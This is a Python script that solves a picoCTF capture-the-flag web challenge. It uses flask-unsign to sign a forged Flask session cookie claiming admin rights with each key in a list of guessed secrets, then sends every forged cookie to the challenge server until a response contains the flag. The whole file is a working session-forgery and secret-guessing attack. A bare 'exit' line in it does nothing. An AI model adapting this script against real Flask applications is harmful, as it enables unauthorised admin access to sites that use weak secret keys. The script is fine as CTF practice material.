import subprocess
import requests

def sign_cookie_with_secrets(secrets, cookie_data="{'very_auth': 'admin'}"):

    signed_cookies = {}

    for secret in secrets:
        try:
            # Build the command
            command = [
                'flask-unsign',
                '--sign',
                '--cookie', cookie_data,
                '--secret', secret
            ]

            # Run the command and capture the output
            result = subprocess.run(command, capture_output=True, text=True, check=True)

            # Store the signed cookie
            signed_cookies[secret] = result.stdout.strip()
        except subprocess.CalledProcessError as e:
            # Handle errors (e.g., invalid secret or command failure)
            signed_cookies[secret] = f"Error: {e.stderr.strip()}"

    return signed_cookies

def check_cookies_for_flag(signed_cookies):
    target_url = 'http://wily-courier.picoctf.net:56132/display'

    for secret, signed_cookie in signed_cookies.items():
        try:
            # Send a GET request with the signed cookie
            cookies = {'session': signed_cookie}
            response = requests.get(target_url, cookies=cookies,allow_redirects=False)
            if response.status_code==302:
                continue

            # Check if the response contains 'picoCTF'
            if 'picoCTF' in response.text:
                print(f"Secret: {secret}\nSigned Cookie: {signed_cookie}\nResponse Text: {response.text}\n")
                exit
        except Exception as e:
            print(f"Error with secret '{secret}': {e}")

# Example usage
if __name__ == "__main__":
    # List of secrets to try
    secrets= ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]


    # Sign the cookie with each secret
    signed_cookies = sign_cookie_with_secrets(secrets)

    # Check each signed cookie for the flag
    check_cookies_for_flag(signed_cookies)
